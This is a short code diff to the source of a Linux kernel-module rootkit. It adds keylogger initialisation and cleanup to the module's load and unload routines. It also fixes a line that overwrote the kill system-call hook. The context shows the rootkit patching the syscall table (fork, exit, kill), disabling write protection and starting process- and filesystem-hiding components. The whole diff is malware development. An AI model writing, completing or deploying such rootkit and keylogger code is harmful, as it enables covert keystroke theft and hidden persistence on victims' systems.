@@ -12,7 +12,7 @@ static int __init lkm_rootkit_init(void)
 {
     printk(KERN_INFO "Hello, World!\n");
 
-    if (proc_init() || hidefs_init())
+    if (proc_init() || hidefs_init() || keylogger_init())
     {
         proc_clean();
         hidefs_clean();
@@ -37,7 +37,6 @@ static int __init lkm_rootkit_init(void)
     syscall_table[__NR_fork] = (unsigned long)rk_fork;
     syscall_table[__NR_exit] = (unsigned long)rk_exit;
     syscall_table[__NR_kill] = (unsigned long)rk_kill;
-    syscall_table[__NR_kill] = (unsigned long)rk_exit_group;
 
     enable_write_protect();
 
@@ -48,6 +47,7 @@ static void __exit lmk_rootkit_exit(void)
 {
     proc_clean();
     hidefs_clean();
+    keylogger_clean();
 
     disable_write_protect();
 
